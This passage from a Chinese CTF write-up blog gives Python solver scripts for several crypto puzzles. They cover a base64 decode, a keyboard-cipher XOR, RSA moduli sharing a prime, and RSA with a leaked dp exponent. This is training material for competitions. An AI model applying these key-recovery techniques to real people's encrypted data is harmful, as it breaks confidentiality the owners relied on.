<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">'VitdV3pZyjhszC9byPBdxh9gUPX9 WjueW3qAzkitaD9czQCeyi9hVQY9 XkvfX3rBaljubE9daRDfzj9iWRZ9 YlwgY3sCbmkvcF9ebSEgak9jXSA9 ZmxhZ3tDcnlwdG9fcTFhbl9kYTB9 AnyiA3uEdomxeH9gdUGicm9lZUC9 BozjB3vFepnyfI9heVHjdn9mAVD9 CpakC3wGfqozgJ9ifWIkeo9nBWE9 DqblD3xHgrpahK9jgXJlfp9oCXF9 ErcmE3yIhsqbiL9khYKmgq9pDYG9 FsdnF3zJitrcjM9liZLnhr9qEZH9 GteoG3aKjusdkN9mjAMois9rFAI9 HufpH3bLkvtelO9nkBNpjt9sGBJ9 IvgqI3cMlwufmP9olCOqku9tHCK9 JwhrJ3dNmxvgnQ9pmDPrlv9uIDL9 KxisK3eOnywhoR9qnEQsmw9vJEM9 LyjtL3fPozxipS9roFRtnx9wKFN9 MzkuM3gQpayjqT9spGSuoy9xLGO9 NalvN3hRqbzkrU9tqHTvpz9yMHP9 ObmwO3iSrcalsV9urIUwqa9zNIQ9 PcnxP3jTsdbmtW9vsJVxrb9aOJR9 QdoyQ3kUtecnuX9wtKWysc9bPKS9 RepzR3lVufdovY9xuLXztd9cQLT9 SfqaS3mWvgepwZ9yvMYaue9dRMU9 TgrbT3nXwhfqxA9zwNZbvf9eSNV9 UhscU3oYxigryB9axOAcwg9fTOW9'</span></span><br><span class="line">a = a.split(<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> str(base64.b64decode(i)):</span><br><span class="line">        print(str(base64.b64decode(i)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="keyboard-amp-xor"><a href="#keyboard-amp-xor" class="headerlink" title="keyboard&amp;xor"></a>keyboard&amp;xor</h2><p>键盘密码就是一些通过键盘构成的特殊密码，这个题的键盘密码就是用数字小键盘按数字的顺序形成一个数字，如987456963，就是9，以此类推得到所有数字，然后与某个字符异或得到flag，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'92 86 91 93 65 121 72 67 74 78 85 101 81 95 67 88 10 91 72 94 101 91 84 94 101 66 10 72 71'</span></span><br><span class="line">a = a.split(<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        flag += chr(int(j)^i)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>这个是n1,n2不互素，求出最大公约数就是q，然后解出p1,p2进行正常解密就行，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1=<span class="number">8217750002563767534507431772672508296790419426359418772262918334942253216838941784065552586515975086629488401848295042795010878472841239208134141867327484743385831827070290102156043891062216546700396355633648746503609316467427792284160550518479557705522433207344486446182975506177779645254798026639207181194801224136301709747692124321259015904882481700734109471769429997266769417563302187369593695274785460459216589287933295897729160407432706119895236061234908823057523578639028050157204710971446984874388372614521839413035519832095286571396291205385892316414519095084590885365387638866410682826642459036672376812420</span></span><br><span class="line">c2=<span class="number">7566958532364114371379519385215370017067741031765877004281206882402131583243640141134242845467979956404950887130100847667426239722484679901620095620477253353118237604524293040400048854766849424968226100958218253784453428802739541285102299539470357988946181084507613000676093180667509014760578303938444875206744223207398915216384207864783675876491715222331647605993719708006088981895093221324357784664757018489923072318925185804618124840229459330521303045652927504098937604785690215649325059881930727158435990766774702128811742126044954713159721156690583264083241605623057819784364016191197778255205802326634502169696</span></span><br><span class="line">n1=<span class="number">10425855462477614367171844445208386014622992692425050430074260102448039387454490304367721918509254546358600675710952184926594800391631253396820479320653692178348490464690117898982202182578852738594728823182103111997498480266825426495100627852400368723752243942103284180615156393358735994546872055150565842883752045496888724915186648706000896778069408685995048316382587065830704528191510082579196492638015354803103072820328602730238598347726753089546703609506564170483974497918695544327858337881157517174537224885086474762136147878595490511738317991477047221966892259425234398288202574664650814814670543089879462250969</span></span><br><span class="line">n2=<span class="number">15766515110295605564479758756980032411600879599379970189803549903544315261085553399160478480793501696012780244509160285700738510494592955881281143435749183974011608784346311244159008079262826595051533934706654747847164739010394791761987521164465315988661975937464230956081568828495008905487030195067877389050231912641823229802644494531530922336348933549500757527878066616013388198512155005420703673647050852840240731929014547634366702023974552173767124792655844658582669224827093172065195618610066498220346107563221399597149406536016187287501864888625698709398126479414379109790233198536518016678629137174151079459577</span></span><br><span class="line">q=gmpy2.gcd(n1,n2)</span><br><span class="line">d1=gmpy2.invert(e, ((n1//q)<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">d2=gmpy2.invert(e, ((n2//q)<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m1=pow(c1,d1,n1)</span><br><span class="line">m2=pow(c2,d2,n2)</span><br><span class="line">print(long_to_bytes(m1)+long_to_bytes(m2))</span><br></pre></td></tr></table></figure>

<h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>两个考点p1，q1很近可以直接yafu分解，dp泄露，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getd</span><span class="params">(n,e,dp)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,e):</span><br><span class="line">        <span class="keyword">if</span> (dp*e<span class="number">-1</span>)%i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:</span><br><span class="line">                p=((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span></span><br><span class="line">                q=n/(((dp*e<span class="number">-1</span>)/i)+<span class="number">1</span>)</span><br><span class="line">                phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">                d = gmpy2.invert(e,phi)%phi</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">dp=<span class="number">3313676147488780004269677749256530901164938685290852713293300135880283216593908718566212310632642274940720655574256172230630003501500729135540846569105660318596269962068874656306135529587693293761755261353082087502945162831629675013563304150693764812713605383584459176590153145253110379580397788632833285641</span></span><br><span class="line">n2=<span class="number">17432371702511515641445330758319580626663835675360471973889541567061362733282602303912273385937275050062522598535126155185966929079633740081171122748299420273977074317730453158885377058943056439513171310361138512553197254939991672337230416762443960791144958841650587111759212146297769349905342027165943673502891841884114610862014679819295175751627124593991961564859661169919768049005016586846043963736105950274061217008822022603496817050696352383629819970702916983094803063512834021610106011942581931071298837201673797067979789462413929658249907770382419444868832257390670216903194832006080879462891030786345473321133</span></span><br><span class="line">c2=<span class="number">12039881757941343412566057609539484250906321411525729350503269767314350877712930485694511109088253977591466330425070524867736378047759843349518537860124696107006690623895116470242801205088950874464072733610260908059982241202766245703075624293105596666232574063769116003161520032496604039664346670808953369545524155173270105041618573868757634570091100968119166159870155019375609120473339022486872441267292089879088332792816065043145052419237476543791727962075323440574841576944978498759899553193900743991497821146941242255543632363744542861361156010435583675699157817000644519248637092574815930152213087352532188592236</span></span><br><span class="line">d1=getd(n2,e,dp)</span><br><span class="line">q=pow(c2,d1,n2)</span><br><span class="line">d2=<span class="number">126718357524005693199390161485378637487639343479947998145083561526434871754408140645858881434806063952980258381684375375095954560284254431735241422492047511150982868431114487453945585382221632069457530876447279703911027394728366834783989367847061198620195031826238305731687819004936696803996919443755803404113167559388751413481508580650942784818218845465868367257899677609280414120762380578192746466003247059826487671090866019437630335330595101656654671248347192139710892796727299548717597826123118839289089380822802211376863209871172990463591165599847134356947900941387262536298663354702834924433042510620537009241</span></span><br><span class="line">c1=<span class="number">6356252143515671855198429881212517870779878618691332923958890647806354452901807941882999374435080560683815150770484395767015510644241357101868959549127328190332610890837788541658702731818713528860989158535390733727768504788767637350164165980590153557477739470795029639701049906017962346848213813923317335790141930549253902882156104051473800652660782956891921403666427334040512683189894667722064736359509822113994604002527654800241703193672245774608801241223636582862073637323810794035377798134552028666324286312078516226824625724078306007237092650085065991784923888316685985201158014227419609844622958359406645985866</span></span><br><span class="line">n1=<span class="number">9320696966386937278572876558100179309795083786358419701946511079414098978864922910783000575300656580568425581998259157079308163880302113010810905842717528325815897023984231385262886452519258250208797083108558215437953986945356876825183289787421829151483413917840830350996211665686348258634731885056592691016315043001324043314137965371102358327534065151196334696138709658120811355017315442831025731822209288250615896139373943549158050126660940574640185787748492894432092789180810792921338770995378783752751356503128348500016213467149492807309171151272392869146889490973107762610701245020894293925853248451646602996787</span></span><br><span class="line">p=pow(c1,d2,n1)</span><br><span class="line">c=<span class="number">4461687424952987605077068597182085166355058890306839578319318982197773270190553004498479395450654210533909382216598556174622636994760707731600493050272837180910221890015116602106069968316931560604914259087855357823329266045866623160528901285175543852317432452682769794293027990726303364460155079615395804248896868158028788409736439387465612986259994251848414228017014841266164456780697508091228072832822395424974788680330410616962493185884334664701874110914830070153216651626683234516621551208392165699559108092244902223135252877798422199307045880823773676790722880935438200146601433088987352732879249827866286031477</span></span><br><span class="line">d=gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,p*q)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>












    </div>

    
    
    
        
      

      <footer class="post-footer">
          
            
          
          <div class="post-tags">
            
              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
            
              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i># crypto</a>
            
          </div>
        

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
              
                <a href="/2019/12/09/2019-GWCTF%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="next" title="2019 GWCTF部分题解">
                  <i class="fa fa-chevron-left"></i> 2019 GWCTF部分题解
                </a>
              
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
              
                <a href="/2019/12/16/2019SWPUCTF-web%E9%A2%98%E8%A7%A3/" rel="prev" title="2019SWPUCTF web题解">
                  2019SWPUCTF web题解 <i class="fa fa-chevron-right"></i>
                </a>
              
            </div>
          </div>
        
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
        
        
        
        
      

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#来签个到吧"><span class="nav-number">1.1.</span> <span class="nav-text">来签个到吧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-number">1.2.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Look-at-my-wife"><span class="nav-number">1.3.</span> <span class="nav-text">Look at my wife</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eazysql"><span class="nav-number">1.4.</span> <span class="nav-text">eazysql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fake-bypass"><span class="nav-number">1.5.</span> <span class="nav-text">Fake_bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你了解webshell吗"><span class="nav-number">1.6.</span> <span class="nav-text">你了解webshell吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eazy-hash"><span class="nav-number">1.7.</span> <span class="nav-text">eazy_hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Real-bypass"><span class="nav-number">1.8.</span> <span class="nav-text">Real_bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你真的懂php弱类型吗？"><span class="nav-number">1.9.</span> <span class="nav-text">你真的懂php弱类型吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Simple-upload"><span class="nav-number">1.10.</span> <span class="nav-text">Simple upload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-qiandao"><span class="nav-number">2.1.</span> <span class="nav-text">Crypto_qiandao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#keyboard-amp-xor"><span class="nav-number">2.2.</span> <span class="nav-text">keyboard&amp;xor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyRSA"><span class="nav-number">2.3.</span> <span class="nav-text">easyRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyRSA"><span class="nav-number">2.4.</span> <span class="nav-text">babyRSA</span></a></li></ol></li></ol></div>
        
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">LiM</p>
  <div class="site-description" itemprop="description">念念不忘，必有回响</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-tags">
        
          
            <a href="/tags/">
          
        
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span>
        </a>
      </div>
    
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LiM</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    
    <span title="Symbols count total">85k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    
    <span title="Reading time total">1:18</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">
      
    Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
  
    <span class="post-meta-divider">|</span>
  
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
  
</div>












        
      </div>
    </footer>
  </div>

  
    
  
  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
<script src="/js/schemes/pisces.js?v=7.4.2"></script>
<script src="/js/next-boot.js?v=7.4.2"></script>



  








  <script src="/js/local-search.js?v=7.4.2"></script>














  

  

  

</body>
</html>
